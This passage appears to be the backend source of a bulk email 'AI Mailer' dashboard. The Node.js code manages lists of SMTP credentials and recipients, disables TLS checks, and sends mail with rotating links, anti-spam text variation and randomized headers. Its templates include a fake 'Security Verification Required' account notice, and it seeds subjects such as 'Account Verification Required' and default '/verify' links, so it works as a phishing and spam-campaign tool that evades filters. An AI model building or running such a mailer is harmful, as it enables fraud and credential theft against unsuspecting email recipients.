const express = require('express');
const cors = require('cors');
const multer = require('multer');
const path = require('path');
const fs = require('fs');
const { spawn } = require('child_process');
const WebSocket = require('ws');
const http = require('http');
const nodemailer = require('nodemailer');
const tls = require('tls');
const dns = require('dns').promises;

const utils = require('./src/utils');
const logger = require('./src/logger');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// Middleware - Smart high-capacity body parsing (handles bulk combos, large HTML templates, & multi-megabyte payloads)
app.use(cors());
app.use(express.json({ limit: '100mb' }));
app.use(express.urlencoded({ limit: '100mb', extended: true, parameterLimit: 100000 }));
app.use(express.static('public'));

// Serve favicon cleanly to prevent 404
app.get('/favicon.ico', (req, res) => {
  const faviconPath = path.join(__dirname, 'public', 'favicon.ico');
  if (fs.existsSync(faviconPath)) {
    return res.sendFile(faviconPath);
  }
  res.status(204).end();
});

// File upload configuration
const upload = multer({ dest: 'uploads/' });

// Helper to get total email count
function getInitialTotalEmails() {
  try {
    const emailsPath = path.join(__dirname, 'emails.txt');
    if (fs.existsSync(emailsPath)) {
      return fs.readFileSync(emailsPath, 'utf8').split('\n').filter(l => l.trim()).length;
    }
  } catch (e) {}
  return 0;
}

// Global state for tracking mailer operations
let mailerProcess = null;
let isRunning = false;
let currentProgress = { sent: 0, total: getInitialTotalEmails(), failed: 0 };

// WebSocket connection handling
wss.on('connection', (ws) => {
  console.log('WebSocket client connected');
  
  // Send current progress on connection
  ws.send(JSON.stringify({
    type: 'progress',
    data: currentProgress
  }));
  
  ws.on('close', () => {
    console.log('WebSocket client disconnected');
  });
});

// Broadcast function for WebSocket
function broadcast(data) {
  wss.clients.forEach(client => {
    if (client.readyState === WebSocket.OPEN) {
      client.send(JSON.stringify(data));
    }
  });
}

// API Routes

// Get configuration
app.get('/api/config', (req, res) => {
  try {
    const configPath = path.join(__dirname, 'config.json');
    const config = JSON.parse(fs.readFileSync(configPath, 'utf8'));
    res.json(config);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Update configuration
app.post('/api/config', (req, res) => {
  try {
    const configPath = path.join(__dirname, 'config.json');
    const currentConfig = JSON.parse(fs.readFileSync(configPath, 'utf8'));
    const updatedConfig = { ...currentConfig, ...req.body };
    
    fs.writeFileSync(configPath, JSON.stringify(updatedConfig, null, 2));
    res.json({ success: true, config: updatedConfig });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Get SMTP credentials
app.get('/api/smtp', (req, res) => {
  try {
    const smtpPath = path.join(__dirname, 'smtp.txt');
    if (!fs.existsSync(smtpPath)) {
      return res.json([]);
    }
    
    const content = fs.readFileSync(smtpPath, 'utf8');
    const credentials = content.split('\n')
      .filter(line => line.trim())
      .map(line => {
        const parts = line.split('|');
        const [host, port, user, pass] = parts;
        const rawDomains = parts[4] ? parts[4].trim() : '';
        const domains = rawDomains ? rawDomains.split(',').map(d => d.trim().toLowerCase()).filter(Boolean) : [];
        return { host, port, user, pass, domains };
      });
    
    res.json(credentials);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Update SMTP credentials
app.post('/api/smtp', (req, res) => {
  try {
    const smtpPath = path.join(__dirname, 'smtp.txt');
    const credentials = req.body.credentials || [];
    
    const content = credentials
      .map(cred => {
        const domainsStr = Array.isArray(cred.domains) && cred.domains.length > 0
          ? `|${cred.domains.join(',')}`
          : (typeof cred.domains === 'string' && cred.domains.trim() ? `|${cred.domains.trim()}` : '');
        return `${cred.host}|${cred.port}|${cred.user}|${cred.pass}${domainsStr}`;
      })
      .join('\n');
    
    fs.writeFileSync(smtpPath, content);
    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Test single SMTP connection
app.post('/api/smtp/test', async (req, res) => {
  const { host, port, user, pass } = req.body;
  if (!host || !port || !user || !pass) {
    return res.status(400).json({ success: false, error: 'Missing required parameters: host, port, user, pass' });
  }
  const portNum = parseInt(port, 10);
  const startTime = Date.now();
  try {
    const transporter = nodemailer.createTransport({
      host,
      port: portNum,
      secure: portNum === 465,
      auth: { user, pass },
      tls: { rejectUnauthorized: false },
      connectionTimeout: 8000,
      greetingTimeout: 6000,
      socketTimeout: 8000
    });
    await transporter.verify();
    const latencyMs = Date.now() - startTime;
    res.json({ success: true, latencyMs, message: `Connected and authenticated in ${latencyMs}ms` });
  } catch (error) {
    const latencyMs = Date.now() - startTime;
    res.status(400).json({ success: false, error: error.message, latencyMs });
  }
});

// Test all saved SMTP connections
app.post('/api/smtp/test-all', async (req, res) => {
  try {
    const smtpPath = path.join(__dirname, 'smtp.txt');
    if (!fs.existsSync(smtpPath)) {
      return res.json({ success: true, results: [] });
    }
    const lines = fs.readFileSync(smtpPath, 'utf8').split('\n').filter(l => l.trim());
    const results = [];

    for (const line of lines) {
      const [host, port, user, pass] = line.split('|');
      if (!host || !port || !user || !pass) continue;
      const portNum = parseInt(port, 10);
      const startTime = Date.now();
      try {
        const transporter = nodemailer.createTransport({
          host,
          port: portNum,
          secure: portNum === 465,
          auth: { user, pass },
          tls: { rejectUnauthorized: false },
          connectionTimeout: 6000,
          greetingTimeout: 5000,
          socketTimeout: 7000
        });
        await transporter.verify();
        results.push({ host, port, user, status: 'ok', latencyMs: Date.now() - startTime });
      } catch (err) {
        results.push({ host, port, user, status: 'failed', error: err.message, latencyMs: Date.now() - startTime });
      }
    }
    res.json({ success: true, results });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Instant live test email send with universal tag resolution
app.post('/api/test-send', async (req, res) => {
  try {
    const { recipient, smtp, subject, htmlBody, senderName } = req.body;
    if (!recipient || !recipient.includes('@')) {
      return res.status(400).json({ success: false, error: 'Valid recipient email address is required' });
    }
    if (!smtp || !smtp.host || !smtp.user || !smtp.pass) {
      return res.status(400).json({ success: false, error: 'SMTP server configuration is required' });
    }

    const templateData = getActiveTemplateData();
    const activeLink = (templateData.links && templateData.links.length > 0)
      ? templateData.links[Math.floor(Math.random() * templateData.links.length)]
      : utils.resolveSmartLink({ lang: templateData.defaultLang });

    const randomId = String(Math.floor(100000 + Math.random() * 900000));
    const context = {
      email: recipient,
      user: recipient.split('@')[0] || '',
      domain: recipient.split('@')[1] || '',
      link: activeLink,
      random_id: randomId,
      randomId: randomId,
      lang: templateData.defaultLang
    };

    const processedSubject = utils.replaceTags(subject || templateData.subject || 'AI Mailer Test Email', context);
    context.subject = processedSubject;

    let processedHtml = utils.replaceTags(htmlBody || templateData.html || '<p>This is a live test email sent from AI Mailer Smart Dashboard.</p>', context);
    processedHtml = utils.addAntiSpamVariation(processedHtml);

    const portNum = parseInt(smtp.port, 10) || 587;
    const transporter = nodemailer.createTransport({
      host: smtp.host,
      port: portNum,
      secure: portNum === 465,
      auth: { user: smtp.user, pass: smtp.pass },
      tls: { rejectUnauthorized: false },
      connectionTimeout: 10000
    });

    const senderDisplayName = (senderName || templateData.senderName || 'AI Mailer Pro').trim();
    const mailOptions = {
      from: `"${senderDisplayName}" <${smtp.user}>`,
      to: recipient,
      subject: processedSubject,
      html: processedHtml,
      text: utils.htmlToPlainText(processedHtml),
      headers: utils.getRandomMailerHeaders(smtp.user)
    };

    const info = await transporter.sendMail(mailOptions);
    res.json({ success: true, messageId: info.messageId, response: info.response });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});



// Get email list
app.get('/api/emails', (req, res) => {
  try {
    const emailsPath = path.join(__dirname, 'emails.txt');
    if (!fs.existsSync(emailsPath)) {
      return res.json([]);
    }
    
    const content = fs.readFileSync(emailsPath, 'utf8');
    const emails = content.split('\n')
      .filter(line => line.trim())
      .map(line => line.trim());
    
    res.json(emails);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Update email list
app.post('/api/emails', (req, res) => {
  try {
    const emailsPath = path.join(__dirname, 'emails.txt');
    const emails = req.body.emails || [];
    
    const content = emails.join('\n');
    fs.writeFileSync(emailsPath, content);
    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Upload email CSV file
app.post('/api/emails/upload', upload.single('file'), (req, res) => {
  try {
    if (!req.file) {
      return res.status(400).json({ error: 'No file uploaded' });
    }
    
    const filePath = req.file.path;
    const content = fs.readFileSync(filePath, 'utf8');
    
    // Parse CSV - simple implementation
    const emails = content.split('\n')
      .map(line => line.trim())
      .filter(line => line && line.includes('@'));
    
    // Clean up uploaded file
    fs.unlinkSync(filePath);
    
    res.json({ success: true, emails });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Smart email cleaning and validation endpoint
app.post('/api/emails/clean', (req, res) => {
  try {
    const emailsPath = path.join(__dirname, 'emails.txt');
    let inputEmails = [];
    if (req.body.emails && Array.isArray(req.body.emails)) {
      inputEmails = req.body.emails;
    } else if (fs.existsSync(emailsPath)) {
      inputEmails = fs.readFileSync(emailsPath, 'utf8').split('\n');
    }

    const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
    const seen = new Set();
    const validEmails = [];
    let duplicateCount = 0;
    let invalidCount = 0;
    const domainCounts = {};

    for (let raw of inputEmails) {
      const email = String(raw).trim().toLowerCase();
      if (!email) continue;
      if (!emailRegex.test(email)) {
        invalidCount++;
        continue;
      }
      if (seen.has(email)) {
        duplicateCount++;
        continue;
      }
      seen.add(email);
      validEmails.push(email);

      const domain = email.split('@')[1];
      domainCounts[domain] = (domainCounts[domain] || 0) + 1;
    }

    const sortedDomains = Object.entries(domainCounts)
      .sort((a, b) => b[1] - a[1])
      .slice(0, 10)
      .map(([domain, count]) => ({ domain, count }));

    if (req.body.save) {
      fs.writeFileSync(emailsPath, validEmails.join('\n'));
    }

    res.json({
      success: true,
      totalOriginal: inputEmails.filter(e => String(e).trim()).length,
      validCount: validEmails.length,
      duplicateCount,
      invalidCount,
      topDomains: sortedDomains,
      cleanedEmails: validEmails
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Curated high-converting responsive template presets
app.get('/api/templates/presets', (req, res) => {
  const presets = [
    {
      id: 'cyber_dark_promo',
      name: '⚡ Cyber Dark VIP Promo',
      category: 'Marketing',
      subject: '🔥 {name}, unlock your exclusive 50% reward today',
      html: `<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<style>
body { margin: 0; padding: 0; background-color: #0b0f19; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; color: #e2e8f0; }
.wrapper { max-width: 600px; margin: 30px auto; background: #161f30; border-radius: 16px; border: 1px solid #2d3748; overflow: hidden; box-shadow: 0 10px 25px rgba(0,0,0,0.5); }
.header { background: linear-gradient(135deg, #4f46e5, #06b6d4); padding: 40px 30px; text-align: center; }
.header h1 { margin: 0; font-size: 26px; color: #ffffff; font-weight: 800; letter-spacing: -0.5px; }
.content { padding: 35px 30px; }
.greeting { font-size: 18px; font-weight: 600; color: #f8fafc; margin-bottom: 15px; }
.body-text { font-size: 15px; line-height: 1.7; color: #94a3b8; margin-bottom: 25px; }
.badge { display: inline-block; background: rgba(6, 182, 212, 0.15); color: #38bdf8; padding: 6px 14px; border-radius: 20px; font-size: 13px; font-weight: 600; margin-bottom: 20px; }
.cta-box { text-align: center; margin: 35px 0 20px; }
.btn { display: inline-block; background: linear-gradient(135deg, #06b6d4, #3b82f6); color: #ffffff; text-decoration: none; padding: 15px 35px; border-radius: 10px; font-weight: 700; font-size: 16px; box-shadow: 0 4px 15px rgba(6, 182, 212, 0.4); }
.footer { padding: 25px 30px; background: #0f172a; border-top: 1px solid #1e293b; text-align: center; font-size: 12px; color: #64748b; }
.footer a { color: #38bdf8; text-decoration: none; }
</style>
</head>
<body>
<div class="wrapper">
  <div class="header">
    <div class="badge">EXCLUSIVE INVITATION</div>
    <h1>Priority Reward Reserved</h1>
  </div>
  <div class="content">
    <div class="greeting">Hello {name},</div>
    <div class="body-text">We have reserved a high-priority tier upgrade for your profile linked to <strong>{email}</strong>. This allocation is locked for the next 24 hours.</div>
    <div class="cta-box">
      <a href="{link}" class="btn">Claim Your Reward &rarr;</a>
    </div>
    <div class="body-text" style="font-size: 13px; color: #64748b; margin-top: 20px;">Reference ID: {random_id} &bull; Generated: {date}</div>
  </div>
  <div class="footer">
    {footer}
    <p>&copy; {date} Premium Communications. All rights reserved.</p>
  </div>
</div>
</body>
</html>`
    },
    {
      id: 'clean_order_receipt',
      name: '📦 Order Confirmation & Receipt',
      category: 'Transactional',
      subject: 'Confirmation for your order #{random_id}',
      html: `<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<style>
body { margin: 0; padding: 0; background: #f8fafc; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif; color: #334155; }
.card { max-width: 580px; margin: 30px auto; background: #ffffff; border-radius: 12px; border: 1px solid #e2e8f0; overflow: hidden; box-shadow: 0 4px 6px -1px rgba(0,0,0,0.05); }
.card-header { padding: 30px; border-bottom: 1px solid #f1f5f9; background: #ffffff; }
.card-body { padding: 30px; }
.btn { display: inline-block; background: #0f172a; color: #ffffff; padding: 12px 28px; border-radius: 8px; text-decoration: none; font-weight: 600; font-size: 14px; }
.card-footer { padding: 20px 30px; background: #f8fafc; font-size: 12px; color: #94a3b8; text-align: center; }
</style>
</head>
<body>
<div class="card">
  <div class="card-header">
    <h2 style="margin: 0; font-size: 20px; color: #0f172a;">Order Confirmation</h2>
    <p style="margin: 5px 0 0; font-size: 13px; color: #64748b;">Order Identifier: #{random_id}</p>
  </div>
  <div class="card-body">
    <p>Hi {name},</p>
    <p>Thank you for your order. We have successfully recorded your details and your package is being prepared for dispatch.</p>
    <div style="margin: 25px 0; text-align: center;">
      <a href="{link}" class="btn">View Order Status & Tracking</a>
    </div>
  </div>
  <div class="card-footer">
    {footer}
  </div>
</div>
</body>
</html>`
    },
    {
      id: 'security_alert',
      name: '🛡️ Security Verification Alert',
      category: 'Security',
      subject: 'Security Notice: Action needed for your account',
      html: `<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<style>
body { margin: 0; padding: 0; background: #0f172a; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; color: #e2e8f0; }
.container { max-width: 560px; margin: 30px auto; background: #1e293b; border-radius: 12px; border: 1px solid #334155; padding: 35px 30px; }
.shield { width: 48px; height: 48px; line-height: 48px; border-radius: 10px; background: #ef4444; color: white; text-align: center; font-size: 22px; font-weight: bold; margin-bottom: 20px; }
.title { font-size: 22px; font-weight: 700; color: #ffffff; margin-bottom: 15px; }
.desc { font-size: 15px; line-height: 1.6; color: #cbd5e1; margin-bottom: 25px; }
.btn { display: inline-block; background: #ef4444; color: white; padding: 14px 30px; border-radius: 8px; text-decoration: none; font-weight: 700; font-size: 15px; }
.footer { margin-top: 30px; padding-top: 20px; border-top: 1px solid #334155; font-size: 12px; color: #64748b; text-align: center; }
</style>
</head>
<body>
<div class="container">
  <div class="shield">&excl;</div>
  <div class="title">Security Verification Required</div>
  <div class="desc">Hello {name},<br><br>We noticed a login verification request for <strong>{email}</strong>. Please confirm your authorization to ensure uninterrupted access.</div>
  <div style="text-align: center; margin: 30px 0;">
    <a href="{link}" class="btn">Verify Authorization Now</a>
  </div>
  <div class="desc" style="font-size: 13px; color: #94a3b8;">If you did not initiate this request, review your security settings immediately.</div>
  <div class="footer">
    {footer}
  </div>
</div>
</body>
</html>`
    }
  ];
  res.json(presets);
});

// Get templates
app.get('/api/templates', (req, res) => {
  try {
    const templatesPath = path.join(__dirname, 'letters');
    if (!fs.existsSync(templatesPath)) {
      return res.json({});
    }
    
    const templates = {};
    const langDirs = fs.readdirSync(templatesPath)
      .filter(item => fs.statSync(path.join(templatesPath, item)).isDirectory());
    
    langDirs.forEach(lang => {
      const langPath = path.join(templatesPath, lang);
      const files = fs.readdirSync(langPath)
        .filter(file => file.endsWith('.html'));
      
      templates[lang] = files.map(file => ({
        name: file,
        content: fs.readFileSync(path.join(langPath, file), 'utf8')
      }));
    });
    
    res.json(templates);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Update template
app.post('/api/templates/:lang/:name', (req, res) => {
  try {
    const { lang, name } = req.params;
    const { content, action } = req.body;
    
    const templatePath = path.join(__dirname, 'letters', lang, name);
    
    if (action === 'delete') {
      // Delete template file
      if (fs.existsSync(templatePath)) {
        fs.unlinkSync(templatePath);
        res.json({ success: true });
      } else {
        res.status(404).json({ error: 'Template not found' });
      }
    } else {
      // Create or update template file
      // Ensure directory exists
      const dirPath = path.join(__dirname, 'letters', lang);
      if (!fs.existsSync(dirPath)) {
        fs.mkdirSync(dirPath, { recursive: true });
      }
      
      fs.writeFileSync(templatePath, content);
      res.json({ success: true });
    }
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Get subjects
app.get('/api/subjects', (req, res) => {
  try {
    const subjectsPath = path.join(__dirname, 'subjects');
    if (!fs.existsSync(subjectsPath)) {
      return res.json({});
    }
    
    const subjects = {};
    const langDirs = fs.readdirSync(subjectsPath)
      .filter(item => fs.statSync(path.join(subjectsPath, item)).isDirectory());
    
    langDirs.forEach(lang => {
      const subjectsFile = path.join(subjectsPath, lang, 'subjects.txt');
      if (fs.existsSync(subjectsFile)) {
        const content = fs.readFileSync(subjectsFile, 'utf8');
        subjects[lang] = content.split('\n').filter(line => line.trim());
      }
    });
    
    res.json(subjects);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Update subjects
app.post('/api/subjects/:lang', (req, res) => {
  try {
    const { lang } = req.params;
    const { subjects } = req.body;
    
    const subjectsFile = path.join(__dirname, 'subjects', lang, 'subjects.txt');
    fs.writeFileSync(subjectsFile, subjects.join('\n'));
    
    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Get links
app.get('/api/links', (req, res) => {
  try {
    const linksPath = path.join(__dirname, 'langs');
    if (!fs.existsSync(linksPath)) {
      return res.json({});
    }
    
    const links = {};
    const langDirs = fs.readdirSync(linksPath)
      .filter(item => fs.statSync(path.join(linksPath, item)).isDirectory());
    
    langDirs.forEach(lang => {
      const linksFile = path.join(linksPath, lang, 'links.txt');
      if (fs.existsSync(linksFile)) {
        const content = fs.readFileSync(linksFile, 'utf8');
        links[lang] = content.split('\n').filter(line => line.trim());
      }
    });
    
    res.json(links);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Update links
app.post('/api/links/:lang', (req, res) => {
  try {
    const { lang } = req.params;
    const { links } = req.body;
    
    const linksFile = path.join(__dirname, 'langs', lang, 'links.txt');
    fs.writeFileSync(linksFile, links.join('\n'));
    
    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Get footers
app.get('/api/footers', (req, res) => {
  try {
    const footersPath = path.join(__dirname, 'footers');
    if (!fs.existsSync(footersPath)) {
      return res.json({});
    }
    
    const footers = {};
    const langDirs = fs.readdirSync(footersPath)
      .filter(item => fs.statSync(path.join(footersPath, item)).isDirectory());
    
    langDirs.forEach(lang => {
      const langPath = path.join(footersPath, lang);
      const files = fs.readdirSync(langPath)
        .filter(file => file.endsWith('.html'));
      
      footers[lang] = files.map(file => ({
        name: file,
        content: fs.readFileSync(path.join(langPath, file), 'utf8')
      }));
    });
    
    res.json(footers);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Update footer
app.post('/api/footers/:lang/:name', (req, res) => {
  try {
    const { lang, name } = req.params;
    const { content, action } = req.body;
    
    const footerPath = path.join(__dirname, 'footers', lang, name);
    
    if (action === 'delete') {
      // Delete footer file
      if (fs.existsSync(footerPath)) {
        fs.unlinkSync(footerPath);
        res.json({ success: true });
      } else {
        res.status(404).json({ error: 'Footer not found' });
      }
    } else {
      // Create or update footer file
      // Ensure directory exists
      const dirPath = path.join(__dirname, 'footers', lang);
      if (!fs.existsSync(dirPath)) {
        fs.mkdirSync(dirPath, { recursive: true });
      }
      
      fs.writeFileSync(footerPath, content);
      res.json({ success: true });
    }
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Smart template management endpoints
app.post('/api/templates/:lang/:name/smart', (req, res) => {
  try {
    const { lang, name } = req.params;
    const { action, content, tags = [], metadata = {} } = req.body;
    
    const templatePath = path.join(__dirname, 'letters', lang, name);
    const metadataPath = path.join(__dirname, 'letters', lang, `.${name}.meta`);
    
    if (action === 'delete') {
      // Delete both template and metadata
      if (fs.existsSync(templatePath)) {
        fs.unlinkSync(templatePath);
        if (fs.existsSync(metadataPath)) {
          fs.unlinkSync(metadataPath);
        }
        res.json({ success: true });
      } else {
        res.status(404).json({ error: 'Template not found' });
      }
    } else if (action === 'create' || action === 'update') {
      // Ensure directory exists
      const dirPath = path.join(__dirname, 'letters', lang);
      if (!fs.existsSync(dirPath)) {
        fs.mkdirSync(dirPath, { recursive: true });
      }
      
      // Save template content
      fs.writeFileSync(templatePath, content);
      
      // Save metadata (tags, creation date, etc.)
      const metadata = {
        tags: tags,
        created: fs.existsSync(metadataPath) ? 
          JSON.parse(fs.readFileSync(metadataPath, 'utf8')).created : 
          new Date().toISOString(),
        modified: new Date().toISOString(),
        type: 'letter',
        name: name
      };
      
      fs.writeFileSync(metadataPath, JSON.stringify(metadata, null, 2));
      
      res.json({ success: true, metadata });
    } else if (action === 'get-metadata') {
      // Return template metadata
      if (fs.existsSync(metadataPath)) {
        const metadata = JSON.parse(fs.readFileSync(metadataPath, 'utf8'));
        res.json({ success: true, metadata });
      } else {
        res.json({ success: true, metadata: null });
      }
    } else {
      res.status(400).json({ error: 'Invalid action' });
    }
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Template search and filter endpoint
app.get('/api/templates/search', (req, res) => {
  try {
    const { query, tags, type, lang } = req.query;
    const templatesPath = path.join(__dirname, 'letters');
    
    if (!fs.existsSync(templatesPath)) {
      return res.json({ results: [] });
    }
    
    const results = [];
    const langDirs = lang ? [lang] : fs.readdirSync(templatesPath)
      .filter(item => fs.statSync(path.join(templatesPath, item)).isDirectory());
    
    langDirs.forEach(currentLang => {
      const langPath = path.join(templatesPath, currentLang);
      if (!fs.existsSync(langPath)) return;
      
      const files = fs.readdirSync(langPath)
        .filter(file => file.endsWith('.html') && !file.startsWith('.'));
      
      files.forEach(file => {
        const templatePath = path.join(langPath, file);
        const metadataPath = path.join(langPath, `.${file}.meta`);
        
        try {
          const content = fs.readFileSync(templatePath, 'utf8');
          const templateName = file;
          
          let metadata = {};
          if (fs.existsSync(metadataPath)) {
            metadata = JSON.parse(fs.readFileSync(metadataPath, 'utf8'));
          }
          
          // Apply filters
          if (query && !content.toLowerCase().includes(query.toLowerCase()) && 
              !templateName.toLowerCase().includes(query.toLowerCase())) {
            return;
          }
          
          if (tags && tags.length > 0) {
            const templateTags = metadata.tags || [];
            const hasMatchingTag = tags.some(tag => templateTags.includes(tag));
            if (!hasMatchingTag) return;
          }
          
          if (type && metadata.type !== type) {
            return;
          }
          
          results.push({
            name: templateName,
            lang: currentLang,
            content: content,
            metadata: metadata,
            size: content.length,
            modified: fs.statSync(templatePath).mtime
          });
          
        } catch (err) {
          console.error(`Error processing template ${file}:`, err);
        }
      });
    });
    
    res.json({ results, count: results.length });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Validation function to check if all required files are ready
function validateMailerPrerequisites() {
  const errors = [];
  
  // Check SMTP credentials
  const smtpPath = path.join(__dirname, 'smtp.txt');
  if (!fs.existsSync(smtpPath)) {
    errors.push('SMTP credentials file (smtp.txt) not found');
  } else {
    const content = fs.readFileSync(smtpPath, 'utf8').trim();
    if (!content) {
      errors.push('No SMTP credentials found in smtp.txt');
    }
  }
  
  // Check email list
  const emailsPath = path.join(__dirname, 'emails.txt');
  if (!fs.existsSync(emailsPath)) {
    errors.push('Email list file (emails.txt) not found');
  } else {
    const content = fs.readFileSync(emailsPath, 'utf8').trim();
    if (!content) {
      errors.push('No email addresses found in emails.txt');
    }
  }
  
  // Check default or available language
  let targetLang = 'DE';
  try {
    const cfg = JSON.parse(fs.readFileSync(path.join(__dirname, 'config.json'), 'utf8'));
    if (cfg.defaultLang) targetLang = cfg.defaultLang;
  } catch (e) {}

  // Check subjects
  const subjectsPath = path.join(__dirname, 'subjects');
  if (!fs.existsSync(subjectsPath)) {
    errors.push('Subjects directory not found');
  } else {
    const langDirs = fs.readdirSync(subjectsPath)
      .filter(item => fs.statSync(path.join(subjectsPath, item)).isDirectory() && !item.startsWith('.'));
    
    if (langDirs.length === 0) {
      errors.push('No language directories found in subjects folder');
    } else {
      const activeLang = langDirs.includes(targetLang) ? targetLang : langDirs[0];
      const subjectsFile = path.join(subjectsPath, activeLang, 'subjects.txt');
      if (!fs.existsSync(subjectsFile) || !fs.readFileSync(subjectsFile, 'utf8').trim()) {
        errors.push(`No valid subjects found for active language: ${activeLang}`);
      }
    }
  }
  
  // Check templates
  const templatesPath = path.join(__dirname, 'letters');
  if (!fs.existsSync(templatesPath)) {
    errors.push('Templates directory (letters) not found');
  } else {
    const langDirs = fs.readdirSync(templatesPath)
      .filter(item => fs.statSync(path.join(templatesPath, item)).isDirectory() && !item.startsWith('.'));
    
    if (langDirs.length === 0) {
      errors.push('No language directories found in letters folder');
    } else {
      const activeLang = langDirs.includes(targetLang) ? targetLang : langDirs[0];
      const langPath = path.join(templatesPath, activeLang);
      const files = fs.existsSync(langPath) ? fs.readdirSync(langPath).filter(f => f.endsWith('.html') && !f.startsWith('.')) : [];
      if (files.length === 0) {
        errors.push(`No HTML templates found for active language: ${activeLang}`);
      }
    }
  }
  
  // Check links
  const linksPath = path.join(__dirname, 'langs');
  if (!fs.existsSync(linksPath)) {
    try { fs.mkdirSync(linksPath, { recursive: true }); } catch (e) {}
  }
  if (fs.existsSync(linksPath)) {
    let langDirs = fs.readdirSync(linksPath)
      .filter(item => fs.statSync(path.join(linksPath, item)).isDirectory() && !item.startsWith('.'));
    
    if (langDirs.length === 0) {
      try {
        const defaultDir = path.join(linksPath, targetLang);
        fs.mkdirSync(defaultDir, { recursive: true });
        fs.writeFileSync(path.join(defaultDir, 'links.txt'), 'https://example.com/verify\nhttps://example.com/portal');
        langDirs = [targetLang];
      } catch (e) {}
    }
    
    const activeLang = langDirs.includes(targetLang) ? targetLang : (langDirs[0] || targetLang);
    const langDir = path.join(linksPath, activeLang);
    if (!fs.existsSync(langDir)) {
      try { fs.mkdirSync(langDir, { recursive: true }); } catch (e) {}
    }
    const linksFile = path.join(langDir, 'links.txt');
    if (!fs.existsSync(linksFile) || !fs.readFileSync(linksFile, 'utf8').trim()) {
      let fallbackLinks = '';
      for (const otherLang of langDirs) {
        const otherFile = path.join(linksPath, otherLang, 'links.txt');
        if (fs.existsSync(otherFile)) {
          const content = fs.readFileSync(otherFile, 'utf8').trim();
          if (content) {
            fallbackLinks = content;
            break;
          }
        }
      }
      if (!fallbackLinks) {
        fallbackLinks = 'https://example.com/verify\nhttps://example.com/portal';
      }
      try {
        fs.writeFileSync(linksFile, fallbackLinks);
      } catch (e) {
        errors.push(`No links found for active language: ${activeLang}`);
      }
    }
  }
  
  // Check footers
  const footersPath = path.join(__dirname, 'footers');
  if (!fs.existsSync(footersPath)) {
    errors.push('Footers directory (footers) not found');
  } else {
    const langDirs = fs.readdirSync(footersPath)
      .filter(item => fs.statSync(path.join(footersPath, item)).isDirectory() && !item.startsWith('.'));
    
    if (langDirs.length === 0) {
      errors.push('No language directories found in footers folder');
    } else {
      const activeLang = langDirs.includes(targetLang) ? targetLang : langDirs[0];
      const langPath = path.join(footersPath, activeLang);
      const files = fs.existsSync(langPath) ? fs.readdirSync(langPath).filter(f => f.endsWith('.html') && !f.startsWith('.')) : [];
      if (files.length === 0) {
        errors.push(`No footer templates found for active language: ${activeLang}`);
      }
    }
  }
  
  return errors;
}

// API endpoint to check prerequisites
app.get('/api/prerequisites', (req, res) => {
  try {
    const errors = validateMailerPrerequisites();
    res.json({
      ready: errors.length === 0,
      errors: errors,
      message: errors.length === 0 ? 'All prerequisites met' : 'Missing prerequisites'
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// API endpoint to generate sample data
app.post('/api/generate-sample-data', (req, res) => {
  try {
    const { type } = req.body;
    
    if (type === 'smtp') {
      // Generate sample SMTP data
      const sampleSmtp = `smtp.gmail.com|587|your-email@gmail.com|your-password
smtp.outlook.com|587|your-email@outlook.com|your-password
smtp.mail.yahoo.com|587|your-email@yahoo.com|your-password`;
      fs.writeFileSync(path.join(__dirname, 'smtp.txt'), sampleSmtp);
      res.json({ success: true, message: 'Sample SMTP credentials generated' });
      
    } else if (type === 'emails') {
      // Generate sample email list
      const sampleEmails = `test@example.com\nsample@domain.com\ndemo@test.com\nuser@website.com`;
      fs.writeFileSync(path.join(__dirname, 'emails.txt'), sampleEmails);
      res.json({ success: true, message: 'Sample email list generated' });
      
    } else if (type === 'all') {
      // Generate all sample data
      
      // Create directories if they don't exist
      const dirs = ['subjects', 'letters', 'langs', 'footers'];
      dirs.forEach(dir => {
        const dirPath = path.join(__dirname, dir);
        if (!fs.existsSync(dirPath)) {
          fs.mkdirSync(dirPath, { recursive: true });
        }
      });
      
      // Create language directories
      const languages = ['EN', 'DE', 'FR', 'ES', 'IT'];
      languages.forEach(lang => {
        ['subjects', 'letters', 'langs', 'footers'].forEach(type => {
          const langPath = path.join(__dirname, type, lang);
          if (!fs.existsSync(langPath)) {
            fs.mkdirSync(langPath, { recursive: true });
          }
        });
      });
      
      // Generate sample subjects
      languages.forEach(lang => {
        const subjects = [
          'Important Update Required',
          'Action Needed: Update Your Information',
          'Please Confirm Your Details',
          'Account Verification Required',
          'Update Your Account Settings'
        ];
        fs.writeFileSync(path.join(__dirname, 'subjects', lang, 'subjects.txt'), subjects.join('\n'));
      });
      
      // Generate sample links
      languages.forEach(lang => {
